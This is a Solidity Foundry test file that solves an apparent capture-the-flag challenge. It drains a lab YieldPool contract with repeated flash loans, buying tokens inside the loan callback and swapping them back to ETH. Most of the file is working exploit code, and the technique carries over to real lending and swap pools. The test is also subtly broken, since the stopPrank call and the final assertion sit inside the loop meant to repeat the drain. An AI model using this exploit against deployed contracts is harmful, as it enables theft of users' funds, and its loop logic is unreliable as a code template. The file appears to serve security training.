// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
// import {FlashLoanReceiver} from "../src/6_yieldPool/FlashLoanReceiver.sol";
/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/

contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/

        // FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver{value: 0.1 ether}();
        // address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

        // console.log(
        //     "initial balance", token.balanceOf(address(yieldPool)) / 1 ether, address(yieldPool).balance / 1 ether
        // );
        // // forgefmt: disable-start
        // flashLoanReceiver.executeAttack(
        //     payable(yieldPool),
        //     address(token),
        //     (10_000 ether),
        //     "");
        // forgefmt: disable-end

        FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver();

        while (address(attacker).balance < 100 ether) {
            // Transfer everything to the FlashLoanReceiver contract.
            payable(address(flashLoanReceiver)).transfer(address(attacker).balance);

            // 1. Flashloan as much ETH as we can afford.
            yieldPool.flashLoan(
                IERC3156FlashBorrower(address(flashLoanReceiver)),
                yieldPool.ETH(),
                address(flashLoanReceiver).balance * 100,
                hex""
            );

            // 3. Exchange Tokens for ETH.
            token.approve(address(yieldPool), token.balanceOf(address(attacker)));
            yieldPool.tokenToEth(token.balanceOf(address(attacker)));

            //==================================================//
            vm.stopPrank();

            assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
        }
    }
}

contract FlashLoanReceiver {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    // Flashloan callback.
    function onFlashLoan(address initiator, address, uint256 amoount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        YieldPool yieldPool = YieldPool(payable(msg.sender));

        // 2. Use all ETH for buying Tokens while paying the loan.
        yieldPool.ethToToken{value: address(this).balance}();

        // Send Tokens to attacker account.
        SecureumToken token = SecureumToken(address(yieldPool.TOKEN()));
        token.transfer(initiator, token.balanceOf(address(this)));

        return CALLBACK_SUCCESS;
    }

    receive() external payable {}
}
